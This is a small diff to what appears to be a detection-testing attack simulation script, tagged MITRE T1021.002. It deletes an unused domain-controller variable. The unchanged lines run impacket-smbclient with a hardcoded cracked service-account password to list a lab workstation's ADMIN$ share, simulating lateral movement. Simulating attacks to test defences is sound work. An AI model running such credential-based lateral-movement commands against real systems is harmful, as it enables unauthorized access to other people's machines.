@@ -6,7 +6,6 @@ set -u -o pipefail
 echo "[SIM-MP-002/T1021.002] Use cracked credential for lateral SMB access"
 
 echo '[MP-002] EDR+NDR: Pass-the-Hash to workstation via SMB';
-DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
 WS_IP="${CORTEXSIM_WS_IP:-10.0.10.20}";
 DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
 impacket-smbclient "$DOMAIN/sql-svc:Summer2024@$WS_IP" -c "ls \\\\ADMIN\$" 2>&1 | head -10 || echo '[*] demo-mode';
